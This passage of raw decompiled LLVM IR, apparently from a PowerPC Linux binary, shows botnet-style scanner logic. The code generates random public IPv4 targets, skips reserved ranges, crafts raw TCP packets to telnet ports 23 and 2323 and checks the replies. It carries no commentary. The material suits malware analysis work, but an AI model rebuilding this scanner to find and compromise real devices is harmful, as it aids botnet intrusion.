  %v1_10007848 = call i32 @__asm_rlwinm(i32 %v0_10007834, i32 16, i32 24, i32 31)
  %v0_1000784c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000784c, label %dec_label_pc_10007834, label %dec_label_pc_10007850

dec_label_pc_10007850:                            ; preds = %dec_label_pc_10007834
  %v0_10007850 = load i32, i32* @r11, align 4
  %v1_10007850 = icmp slt i32 %v0_10007850, 0
  %v3_10007850 = icmp eq i32 %v0_10007850, 0
  store i1 %v1_10007850, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007850, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007850, label %dec_label_pc_10007834, label %dec_label_pc_10007858

dec_label_pc_10007858:                            ; preds = %dec_label_pc_10007850
  %v1_10007858 = icmp slt i32 %v0_10007850, 3
  %v3_10007858 = icmp eq i32 %v0_10007850, 3
  store i1 %v1_10007858, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007858, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007858, label %dec_label_pc_10007834, label %dec_label_pc_10007860

dec_label_pc_10007860:                            ; preds = %dec_label_pc_10007858
  %v1_10007860 = add i32 %v0_10007850, 241
  %v1_10007864 = urem i32 %v1_10007860, 256
  store i32 %v1_10007864, i32* %r0.global-to-local, align 4
  %v1_10007868 = icmp eq i32 %v1_10007864, 0
  %v3_10007868 = icmp eq i32 %v1_10007864, 1
  store i1 %v1_10007868, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007868, i1* %cr7_eq.global-to-local, align 1
  %tmp156 = or i32 %v1_10007864, 1
  %tmp157 = icmp eq i32 %tmp156, 1
  br i1 %tmp157, label %dec_label_pc_10007834, label %dec_label_pc_10007870

dec_label_pc_10007870:                            ; preds = %dec_label_pc_10007860
  %v1_10007870 = icmp slt i32 %v0_10007850, 56
  %v3_10007870 = icmp eq i32 %v0_10007850, 56
  store i1 %v1_10007870, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007870, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007870, label %dec_label_pc_10007834, label %dec_label_pc_10007878

dec_label_pc_10007878:                            ; preds = %dec_label_pc_10007870
  %v1_10007878 = icmp slt i32 %v0_10007850, 10
  %v3_10007878 = icmp eq i32 %v0_10007850, 10
  store i1 %v1_10007878, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007878, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007878, label %dec_label_pc_10007834, label %dec_label_pc_10007880

dec_label_pc_10007880:                            ; preds = %dec_label_pc_10007878
  %v1_10007880 = icmp slt i32 %v0_10007850, 192
  %v3_10007880 = icmp eq i32 %v0_10007850, 192
  store i1 %v1_10007880, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007880, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007880, label %dec_label_pc_10007bdc, label %dec_label_pc_10007888

dec_label_pc_10007888:                            ; preds = %dec_label_pc_10007880
  %v1_10007888 = icmp slt i32 %v0_10007850, 172
  %v3_10007888 = icmp eq i32 %v0_10007850, 172
  store i1 %v1_10007888, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007888, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007888, label %dec_label_pc_10007c08, label %dec_label_pc_10007890

dec_label_pc_10007890:                            ; preds = %dec_label_pc_10007888
  %v1_10007890 = icmp slt i32 %v0_10007850, 100
  %v3_10007890 = icmp eq i32 %v0_10007850, 100
  store i1 %v1_10007890, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007890, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007890, label %dec_label_pc_10007be8, label %dec_label_pc_10007898

dec_label_pc_10007898:                            ; preds = %dec_label_pc_10007890
  %v1_10007898 = icmp slt i32 %v0_10007850, 169
  %v3_10007898 = icmp eq i32 %v0_10007850, 169
  store i1 %v1_10007898, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007898, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007898, label %dec_label_pc_10007bfc, label %dec_label_pc_100078a0

dec_label_pc_100078a0:                            ; preds = %dec_label_pc_10007898
  %v1_100078a0 = icmp slt i32 %v0_10007850, 198
  %v3_100078a0 = icmp eq i32 %v0_10007850, 198
  store i1 %v1_100078a0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100078a0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100078a0, label %dec_label_pc_10007c1c, label %dec_label_pc_100078a8

dec_label_pc_100078a8:                            ; preds = %dec_label_pc_100078a0
  %v1_100078a8 = icmp ult i32 %v0_10007850, 223
  %v2_100078a8 = icmp ugt i32 %v0_10007850, 223
  %v3_100078a8 = icmp eq i32 %v0_10007850, 223
  store i1 %v1_100078a8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100078a8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100078a8, label %dec_label_pc_10007834, label %dec_label_pc_100078b0

dec_label_pc_100078b0:                            ; preds = %dec_label_pc_10007c10, %dec_label_pc_10007bf0, %dec_label_pc_10007c1c, %dec_label_pc_10007c08, %dec_label_pc_10007be8, %dec_label_pc_100078a8, %dec_label_pc_10007bdc.dec_label_pc_100078b0_crit_edge
  %v0_1000792464 = phi i32 [ %v0_1000792465, %dec_label_pc_10007bdc.dec_label_pc_100078b0_crit_edge ], [ %v1_10007848, %dec_label_pc_100078a8 ], [ %v1_10007848, %dec_label_pc_10007be8 ], [ %v1_10007848, %dec_label_pc_10007c08 ], [ %v1_10007848, %dec_label_pc_10007c1c ], [ %v1_10007848, %dec_label_pc_10007bf0 ], [ %v1_10007848, %dec_label_pc_10007c10 ]
  %v0_10007910 = phi i32 [ %v0_100078b0.pre, %dec_label_pc_10007bdc.dec_label_pc_100078b0_crit_edge ], [ %v0_10007850, %dec_label_pc_100078a8 ], [ 100, %dec_label_pc_10007be8 ], [ 172, %dec_label_pc_10007c08 ], [ 198, %dec_label_pc_10007c1c ], [ 100, %dec_label_pc_10007bf0 ], [ 172, %dec_label_pc_10007c10 ]
  %stack_var_-96.3.off0 = phi i32 [ %stack_var_-96.7.off0, %dec_label_pc_10007bdc.dec_label_pc_100078b0_crit_edge ], [ %stack_var_-96.2.off0.ph, %dec_label_pc_100078a8 ], [ %stack_var_-96.2.off0.ph, %dec_label_pc_10007be8 ], [ %stack_var_-96.2.off0.ph, %dec_label_pc_10007c08 ], [ %stack_var_-96.2.off0.ph, %dec_label_pc_10007c1c ], [ %stack_var_-96.2.off0.ph, %dec_label_pc_10007bf0 ], [ %stack_var_-96.2.off0.ph, %dec_label_pc_10007c10 ]
  %v1_100078b0 = add i32 %v0_10007910, 250
  %v1_100078b4 = urem i32 %v1_100078b0, 256
  store i32 %v1_100078b4, i32* %r0.global-to-local, align 4
  %v1_100078b8 = icmp eq i32 %v1_100078b4, 0
  %v3_100078b8 = icmp eq i32 %v1_100078b4, 1
  store i1 %v1_100078b8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100078b8, i1* %cr7_eq.global-to-local, align 1
  %tmp158 = or i32 %v1_100078b4, 1
  %tmp159 = icmp eq i32 %tmp158, 1
  br i1 %tmp159, label %dec_label_pc_10007834.preheader, label %dec_label_pc_100078c0

dec_label_pc_100078c0:                            ; preds = %dec_label_pc_100078b0
  %v1_100078c0 = icmp slt i32 %v0_10007910, 11
  %v3_100078c0 = icmp eq i32 %v0_10007910, 11
  store i1 %v1_100078c0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100078c0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100078c0, label %dec_label_pc_10007834.preheader, label %dec_label_pc_100078c8

dec_label_pc_100078c8:                            ; preds = %dec_label_pc_100078c0
  %v1_100078c8 = icmp slt i32 %v0_10007910, 21
  %v3_100078c8 = icmp eq i32 %v0_10007910, 21
  store i1 %v1_100078c8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100078c8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100078c8, label %dec_label_pc_10007834.preheader, label %dec_label_pc_100078d0

dec_label_pc_100078d0:                            ; preds = %dec_label_pc_100078c8
  %v1_100078d0 = icmp slt i32 %v0_10007910, 22
  %v3_100078d0 = icmp eq i32 %v0_10007910, 22
  store i1 %v1_100078d0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100078d0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100078d0, label %dec_label_pc_10007834.preheader, label %dec_label_pc_100078d8

dec_label_pc_100078d8:                            ; preds = %dec_label_pc_100078d0
  %v1_100078d8 = icmp slt i32 %v0_10007910, 26
  %v3_100078d8 = icmp eq i32 %v0_10007910, 26
  store i1 %v1_100078d8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100078d8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100078d8, label %dec_label_pc_10007834.preheader, label %dec_label_pc_100078e0

dec_label_pc_100078e0:                            ; preds = %dec_label_pc_100078d8
  %v1_100078e0 = icmp slt i32 %v0_10007910, 28
  %v3_100078e0 = icmp eq i32 %v0_10007910, 28
  store i1 %v1_100078e0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100078e0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100078e0, label %dec_label_pc_10007834.preheader, label %dec_label_pc_100078e8

dec_label_pc_100078e8:                            ; preds = %dec_label_pc_100078e0
  %v1_100078e8 = icmp slt i32 %v0_10007910, 29
  %v3_100078e8 = icmp eq i32 %v0_10007910, 29
  store i1 %v1_100078e8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100078e8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100078e8, label %dec_label_pc_10007834.preheader, label %dec_label_pc_100078f0

dec_label_pc_100078f0:                            ; preds = %dec_label_pc_100078e8
  %v1_100078f0 = icmp slt i32 %v0_10007910, 30
  %v3_100078f0 = icmp eq i32 %v0_10007910, 30
  store i1 %v1_100078f0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100078f0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100078f0, label %dec_label_pc_10007834.preheader, label %dec_label_pc_100078f8

dec_label_pc_100078f8:                            ; preds = %dec_label_pc_100078f0
  %v1_100078f8 = icmp slt i32 %v0_10007910, 33
  %v3_100078f8 = icmp eq i32 %v0_10007910, 33
  store i1 %v1_100078f8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100078f8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100078f8, label %dec_label_pc_10007834.preheader, label %dec_label_pc_10007900

dec_label_pc_10007900:                            ; preds = %dec_label_pc_100078f8
  %v1_10007900 = icmp slt i32 %v0_10007910, 55
  %v3_10007900 = icmp eq i32 %v0_10007910, 55
  store i1 %v1_10007900, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007900, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007900, label %dec_label_pc_10007834.preheader, label %dec_label_pc_10007908

dec_label_pc_10007908:                            ; preds = %dec_label_pc_10007900
  %v1_10007908 = icmp slt i32 %v0_10007910, 214
  %v3_10007908 = icmp eq i32 %v0_10007910, 214
  store i1 %v1_10007908, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007908, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007908, label %dec_label_pc_10007834.preheader, label %dec_label_pc_10007910

dec_label_pc_10007910:                            ; preds = %dec_label_pc_10007908
  %v1_10007910 = icmp slt i32 %v0_10007910, 215
  %v3_10007910 = icmp eq i32 %v0_10007910, 215
  store i1 %v1_10007910, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007910, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007910, label %dec_label_pc_10007834.preheader, label %dec_label_pc_10007910.dec_label_pc_10007918_crit_edge

dec_label_pc_10007910.dec_label_pc_10007918_crit_edge: ; preds = %dec_label_pc_10007910
  %v0_1000791c.pre = load i32, i32* @r9, align 4
  br label %dec_label_pc_10007918

dec_label_pc_10007918:                            ; preds = %dec_label_pc_10007c24, %dec_label_pc_10007bfc, %dec_label_pc_10007910.dec_label_pc_10007918_crit_edge
  %v0_10007924 = phi i32 [ %v0_1000792464, %dec_label_pc_10007910.dec_label_pc_10007918_crit_edge ], [ %v1_10007848, %dec_label_pc_10007bfc ], [ %v1_10007848, %dec_label_pc_10007c24 ]
  %v0_1000791c = phi i32 [ %v0_1000791c.pre, %dec_label_pc_10007910.dec_label_pc_10007918_crit_edge ], [ %v0_10007bfc, %dec_label_pc_10007bfc ], [ %v0_10007c1c, %dec_label_pc_10007c24 ]
  %v0_10007918 = phi i32 [ %v0_10007910, %dec_label_pc_10007910.dec_label_pc_10007918_crit_edge ], [ 169, %dec_label_pc_10007bfc ], [ 198, %dec_label_pc_10007c24 ]
  %stack_var_-96.4.off0 = phi i32 [ %stack_var_-96.3.off0, %dec_label_pc_10007910.dec_label_pc_10007918_crit_edge ], [ %stack_var_-96.2.off0.ph, %dec_label_pc_10007bfc ], [ %stack_var_-96.2.off0.ph, %dec_label_pc_10007c24 ]
  %v1_10007918 = mul i32 %v0_10007918, 16777216
  %v1_1000791c = mul i32 %v0_1000791c, 65536
  %v1_10007924 = mul i32 %v0_10007924, 256
  %v1_10007928 = load i32, i32* @r10, align 4
  %v0_1000792c = load i32, i32* @r24, align 4
  store i32 %v0_1000792c, i32* @r3, align 4
  %v2_10007920 = or i32 %v1_1000791c, %v1_10007924
  %v2_10007928 = or i32 %v2_10007920, %v1_10007918
  %v2_10007930 = or i32 %v2_10007928, %v1_10007928
  store i32 %v2_10007930, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10007938 = add i32 %v0_1000792c, 16
  %v3_10007938 = inttoptr i32 %v2_10007938 to i32*
  store i32 %v2_10007930, i32* %v3_10007938, align 4
  %v0_10007940 = load i32, i32* %r9.global-to-local, align 4
  %v1_10007940 = trunc i32 %v0_10007940 to i16
  %v2_10007940 = load i32, i32* @r24, align 4
  %v3_10007940 = add i32 %v2_10007940, 10
  %v4_10007940 = inttoptr i32 %v3_10007940 to i16*
  store i16 %v1_10007940, i16* %v4_10007940, align 2
  %v2_10007944 = call i32 @checksum_generic(i32 %v0_1000792c, i32 20)
  %v3_10007944 = trunc i32 %v2_10007944 to i16
  %v3_10007948 = load i32, i32* %stack_var_-1936, align 4
  store i32 %v3_10007948, i32* %r9.global-to-local, align 4
  store i32 %stack_var_-96.4.off0, i32* %r10.global-to-local, align 4
  %tmp = icmp slt i32 %v3_10007948, 0
  %v1_10007950 = zext i1 %tmp to i32
  %v2_10007950 = ashr i32 %v3_10007948, 31
  %v3_10007950 = and i32 %v2_10007950, -2
  %v4_10007950 = or i32 %v3_10007950, %v1_10007950
  store i32 %v4_10007950, i32* %r11.global-to-local, align 4
  %v3_10007954 = load i32, i32* @r24, align 4
  %v4_10007954 = add i32 %v3_10007954, 10
  %v5_10007954 = inttoptr i32 %v4_10007954 to i16*
  store i16 %v3_10007944, i16* %v5_10007954, align 2
  %v0_10007958 = load i32, i32* %r9.global-to-local, align 4
  %v1_10007958 = load i32, i32* %r10.global-to-local, align 4
  %v2_10007958 = sext i32 %v0_10007958 to i64
  %v3_10007958 = sext i32 %v1_10007958 to i64
  %v4_10007958 = mul nsw i64 %v3_10007958, %v2_10007958
  %v5_10007958 = udiv i64 %v4_10007958, 4294967296
  %v6_10007958 = trunc i64 %v5_10007958 to i32
  %v1_1000795c3 = udiv i64 %v4_10007958, 17179869184
  %v1_1000795c = trunc i64 %v1_1000795c3 to i32
  %v2_1000795c = ashr i32 %v6_10007958, 31
  %v3_1000795c = and i32 %v2_1000795c, -1073741824
  %v4_1000795c = or i32 %v3_1000795c, %v1_1000795c
  %v0_10007960 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007960 = sub i32 %v4_1000795c, %v0_10007960
  %v1_10007964 = mul i32 %v2_10007960, 10
  %v2_10007968 = icmp slt i32 %v0_10007958, %v1_10007964
  %v4_10007968 = icmp eq i32 %v0_10007958, %v1_10007964
  store i1 %v2_10007968, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10007968, i1* %cr7_eq.global-to-local, align 1
  %. = select i1 %v4_10007968, i32 2323, i32 23
  %.6 = select i1 %v4_10007968, i16 2323, i16 23
  store i32 %., i32* %r0.global-to-local, align 4
  store i16 %.6, i16* @global_var_100212ba.170, align 2
  %v0_10007978 = load i32, i32* @r24, align 4
  %v1_10007978 = add i32 %v0_10007978, 16
  %v2_10007978 = inttoptr i32 %v1_10007978 to i32*
  %v3_10007978 = load i32, i32* %v2_10007978, align 4
  store i32 %v3_10007978, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_100212c8.204 to i16*), align 4
  %v0_10007984 = load i32, i32* @r30, align 4
  store i32 %v0_10007984, i32* @r4, align 4
  store i32 %v3_10007978, i32* @global_var_100212bc.205, align 4
  %v4_10007998 = call i32 @checksum_tcpudp(i32 %v0_10007978, i32 %v0_10007984, i32 20, i32 20)
  %v5_10007998 = trunc i32 %v4_10007998 to i16
  store i32 268500992, i32* %r10.global-to-local, align 4
  store i16 %v5_10007998, i16* bitcast (i32* @global_var_100212c8.204 to i16*), align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_100079a8 = load i32, i32* @r24, align 4
  %v1_100079a8 = add i32 %v0_100079a8, 16
  %v2_100079a8 = inttoptr i32 %v1_100079a8 to i32*
  %v3_100079a8 = load i32, i32* %v2_100079a8, align 4
  store i32 %v3_100079a8, i32* %r9.global-to-local, align 4
  %v3_100079b0 = load i16, i16* @global_var_100212ba.170, align 2
  %v4_100079b0 = zext i16 %v3_100079b0 to i32
  store i32 %v4_100079b0, i32* %r11.global-to-local, align 4
  %v3_100079b8 = load i32, i32* @global_var_1002120c.158, align 4
  %v2_100079bc = ptrtoint i32* %stack_var_-1904 to i32
  store i32 %v2_100079bc, i32* %r7.global-to-local, align 4
  %v3_100079c0 = load i32, i32* @global_var_10010148, align 4
  store i32 16, i32* %r8.global-to-local, align 4
  store i32 2, i32* %stack_var_-1904, align 4
  store i32 268466648, i32* @lr, align 4
  %v6_100079d4 = call i32 @__libc_sendto(i32 %v3_100079b8, i32 %v3_100079c0, i32 40, i32 16384, i32 %v2_100079bc, i32 16)
  %v3_100079d8 = load i32, i32* %stack_var_-1936, align 4
  %v1_100079dc = add i32 %v3_100079d8, 1
  store i32 %v1_100079dc, i32* %r9.global-to-local, align 4
  %v1_100079e0 = icmp slt i32 %v1_100079dc, 383
  %v3_100079e0 = icmp eq i32 %v1_100079dc, 383
  store i1 %v1_100079e0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100079e0, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_100079dc, i32* %stack_var_-1936, align 4
  %tmp160 = icmp slt i32 %v1_100079dc, 384
  br i1 %tmp160, label %dec_label_pc_10007810, label %dec_label_pc_100079ec

dec_label_pc_100079ec:                            ; preds = %dec_label_pc_10007918
  br label %dec_label_pc_100079f0

dec_label_pc_100079f0:                            ; preds = %dec_label_pc_100077fc, %dec_label_pc_100079ec
  %stack_var_-96.5.off0 = phi i32 [ %stack_var_-96.4.off0, %dec_label_pc_100079ec ], [ %stack_var_-96.0.off0, %dec_label_pc_100077fc ]
  %v0_100079f0 = call i32 @__GI___errno_location()
  store i32 0, i32* %r29.global-to-local, align 4
  %v2_10007a00 = ptrtoint i32* %stack_var_-1632 to i32
  %v4_10007a4c = zext i8 %tmp111 to i32
  %v1_10007a50 = icmp ult i8 %tmp111, 6
  %v3_10007a50 = icmp eq i8 %tmp111, 6
  %v4_10007a58 = zext i16 %tmp110 to i32
  %v1_10007a60 = icmp ult i16 %tmp110, 23
  %v3_10007a60 = icmp eq i16 %tmp110, 23
  %v4_10007a70 = zext i16 %tmp109 to i32
  %v1_10007a80 = and i32 %tmp108, 131072
  %v3_10007a80 = icmp eq i32 %v1_10007a80, 0
  %v1_10007aa8 = add i32 %tmp107, -1
  %v2_10007aac = icmp slt i32 %v1_10007aa8, %tmp106
  %v4_10007aac = icmp eq i32 %v1_10007aa8, %tmp106
  %v1_10007a88 = and i32 %tmp108, 1048576
  %v3_10007a88 = icmp eq i32 %v1_10007a88, 0
  %v1_10007a90 = and i32 %tmp108, 262144
  %v3_10007a90 = icmp eq i32 %v1_10007a90, 0
  %v1_10007a98 = and i32 %tmp108, 65536
  %v3_10007a98 = icmp eq i32 %v1_10007a98, 0
  %v1_10007a68 = icmp ult i16 %tmp110, 2323
  %v3_10007a68 = icmp eq i16 %tmp110, 2323
  br label %dec_label_pc_100079fc

dec_label_pc_100079fc:                            ; preds = %dec_label_pc_10007aa0, %dec_label_pc_10007a98, %dec_label_pc_10007a90, %dec_label_pc_10007a70, %dec_label_pc_10007a68, %dec_label_pc_10007a4c, %dec_label_pc_10007a3c, %dec_label_pc_10007a88, %dec_label_pc_10007a7c, %dec_label_pc_10007a34, %dec_label_pc_10007b28, %dec_label_pc_100079f0
  %v1_10007a04 = phi i32 [ %v0_100079f0, %dec_label_pc_100079f0 ], [ %v1_10007a04.pre.pre, %dec_label_pc_10007b28 ], [ %v0_10007a28, %dec_label_pc_10007a34 ], [ %v0_10007a28, %dec_label_pc_10007a7c ], [ %v0_10007a28, %dec_label_pc_10007a88 ], [ %v0_10007a28, %dec_label_pc_10007a3c ], [ %v0_10007a28, %dec_label_pc_10007a4c ], [ %v0_10007a28, %dec_label_pc_10007a68 ], [ %v0_10007a28, %dec_label_pc_10007a70 ], [ %v0_10007a28, %dec_label_pc_10007a90 ], [ %v0_10007a28, %dec_label_pc_10007a98 ], [ %v0_10007a28, %dec_label_pc_10007aa0 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10007a04 = inttoptr i32 %v1_10007a04 to i32*
  store i32 0, i32* %v2_10007a04, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v3_10007a14 = load i32, i32* @global_var_1002120c.158, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 268466720, i32* @lr, align 4
  %v6_10007a1c = call i32 @__libc_recvfrom(i32 %v3_10007a14, i32 %v2_10007a00, i32 1514, i32 16384, i32 0, i32 0)
  %tmp161 = icmp slt i32 %v6_10007a1c, 1
  br i1 %tmp161, label %dec_label_pc_10007c30, label %dec_label_pc_10007a28

dec_label_pc_10007a28:                            ; preds = %dec_label_pc_100079fc
  %v0_10007a28 = load i32, i32* @r25, align 4
  %v1_10007a28 = inttoptr i32 %v0_10007a28 to i32*
  %v2_10007a28 = load i32, i32* %v1_10007a28, align 4
  store i32 %v2_10007a28, i32* %r0.global-to-local, align 4
  %v1_10007a2c = icmp slt i32 %v2_10007a28, 11
  %v3_10007a2c = icmp eq i32 %v2_10007a28, 11
  store i1 %v1_10007a2c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007a2c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007a2c, label %dec_label_pc_10007c30, label %dec_label_pc_10007a34

dec_label_pc_10007a34:                            ; preds = %dec_label_pc_10007a28
  %v1_10007a34 = icmp ult i32 %v6_10007a1c, 39
  %v3_10007a34 = icmp eq i32 %v6_10007a1c, 39
  store i1 %v1_10007a34, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007a34, i1* %cr7_eq.global-to-local, align 1
  %tmp162 = icmp ult i32 %v6_10007a1c, 40
  br i1 %tmp162, label %dec_label_pc_100079fc, label %dec_label_pc_10007a3c

dec_label_pc_10007a3c:                            ; preds = %dec_label_pc_10007a34
  %v3_10007a3c = load i32, i32* @global_var_100211e0.76, align 4
  store i32 %v3_10007a3c, i32* %r0.global-to-local, align 4
  store i32 %tmp112, i32* %r9.global-to-local, align 4
  %v2_10007a44 = icmp slt i32 %tmp112, %v3_10007a3c
  %v4_10007a44 = icmp eq i32 %tmp112, %v3_10007a3c
  store i1 %v2_10007a44, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10007a44, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10007a44, label %dec_label_pc_10007a4c, label %dec_label_pc_100079fc

dec_label_pc_10007a4c:                            ; preds = %dec_label_pc_10007a3c
  store i32 %v4_10007a4c, i32* %r0.global-to-local, align 4
  store i1 %v1_10007a50, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007a50, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007a50, label %dec_label_pc_10007a58, label %dec_label_pc_100079fc

dec_label_pc_10007a58:                            ; preds = %dec_label_pc_10007a4c
  store i32 %v4_10007a58, i32* @r8, align 4
  store i32 %v4_10007a58, i32* %r0.global-to-local, align 4
  store i1 %v1_10007a60, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007a60, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007a60, label %dec_label_pc_10007a70, label %dec_label_pc_10007a68

dec_label_pc_10007a68:                            ; preds = %dec_label_pc_10007a58
  store i1 %v1_10007a68, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007a68, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007a68, label %dec_label_pc_10007a70, label %dec_label_pc_100079fc

dec_label_pc_10007a70:                            ; preds = %dec_label_pc_10007a68, %dec_label_pc_10007a58
  store i32 %v4_10007a70, i32* %r0.global-to-local, align 4
  %v1_10007a74 = load i32, i32* @r23, align 4
  %v2_10007a74 = icmp slt i32 %v4_10007a70, %v1_10007a74
  %v4_10007a74 = icmp eq i32 %v4_10007a70, %v1_10007a74
  store i1 %v2_10007a74, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10007a74, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10007a74, label %dec_label_pc_10007a7c, label %dec_label_pc_100079fc

dec_label_pc_10007a7c:                            ; preds = %dec_label_pc_10007a70
  store i32 %tmp108, i32* %r0.global-to-local, align 4
  store i32 %v1_10007a80, i32* %r9.global-to-local, align 4
  br i1 %v3_10007a80, label %dec_label_pc_100079fc, label %dec_label_pc_10007a88

dec_label_pc_10007a88:                            ; preds = %dec_label_pc_10007a7c
  store i32 %v1_10007a88, i32* %r10.global-to-local, align 4
  br i1 %v3_10007a88, label %dec_label_pc_100079fc, label %dec_label_pc_10007a90

dec_label_pc_10007a90:                            ; preds = %dec_label_pc_10007a88
  store i32 %v1_10007a90, i32* %r11.global-to-local, align 4
  br i1 %v3_10007a90, label %dec_label_pc_10007a98, label %dec_label_pc_100079fc

dec_label_pc_10007a98:                            ; preds = %dec_label_pc_10007a90
  store i32 %v1_10007a98, i32* %r9.global-to-local, align 4
  br i1 %v3_10007a98, label %dec_label_pc_10007aa0, label %dec_label_pc_100079fc

dec_label_pc_10007aa0:                            ; preds = %dec_label_pc_10007a98
  store i32 %tmp106, i32* %r10.global-to-local, align 4
  store i32 %v1_10007aa8, i32* %r9.global-to-local, align 4
  store i1 %v2_10007aac, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10007aac, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10007aac, label %dec_label_pc_10007ab4, label %dec_label_pc_100079fc

dec_label_pc_10007ab4:                            ; preds = %dec_label_pc_10007aa0
  %v0_10007ab4 = load i32, i32* @r29, align 4
  %v1_10007ab4 = icmp slt i32 %v0_10007ab4, 255
  %v2_10007ab4 = icmp sgt i32 %v0_10007ab4, 255
  %v3_10007ab4 = icmp eq i32 %v0_10007ab4, 255
  store i1 %v1_10007ab4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007ab4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10007ab4, label %dec_label_pc_10007c30, label %dec_label_pc_10007abc

dec_label_pc_10007abc:                            ; preds = %dec_label_pc_10007ab4
  %v3_10007ac4 = load i32, i32* @global_var_10021208.157, align 4
  store i32 %v3_10007ac4, i32* %r11.global-to-local, align 4
  %v1_10007ac8 = mul i32 %v0_10007ab4, 256
  store i32 %v1_10007ac8, i32* %r9.global-to-local, align 4
  %v2_10007acc = mul i32 %v0_10007ab4, 288
  store i32 %v2_10007acc, i32* %r0.global-to-local, align 4
  %v2_10007ad0 = add i32 %v3_10007ac4, %v2_10007acc
  store i32 %v2_10007ad0, i32* @r3, align 4
  %v1_10007ad4 = add i32 %v2_10007ad0, 12
  %v2_10007ad4 = inttoptr i32 %v1_10007ad4 to i32*
  %v3_10007ad4 = load i32, i32* %v2_10007ad4, align 4
  store i32 %v3_10007ad4, i32* %r9.global-to-local, align 4
  %v1_10007ad8 = icmp slt i32 %v3_10007ad4, 0
  %v3_10007ad8 = icmp eq i32 %v3_10007ad4, 0
  store i1 %v1_10007ad8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10007ad8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007ad8, label %dec_label_pc_10007b20, label %dec_label_pc_10007ae0

dec_label_pc_10007ae0:                            ; preds = %dec_label_pc_10007abc
  %v2_10007aec = add i32 %v2_10007acc, 288
  store i32 %v0_10007ab4, i32* %r9.global-to-local, align 4
  %v2_10007af4 = add i32 %v2_10007aec, %v3_10007ac4
  store i32 %v2_10007af4, i32* %r11.global-to-local, align 4
  %v1_10007af8 = sub i32 256, %v0_10007ab4
  store i32 %v1_10007af8, i32* %r0.global-to-local, align 4
  store i32 %v1_10007af8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10007b00

dec_label_pc_10007b00:                            ; preds = %dec_label_pc_10007b08, %dec_label_pc_10007ae0
  %v0_10007b08 = phi i32 [ %v1_10007b10, %dec_label_pc_10007b08 ], [ %v2_10007af4, %dec_label_pc_10007ae0 ]
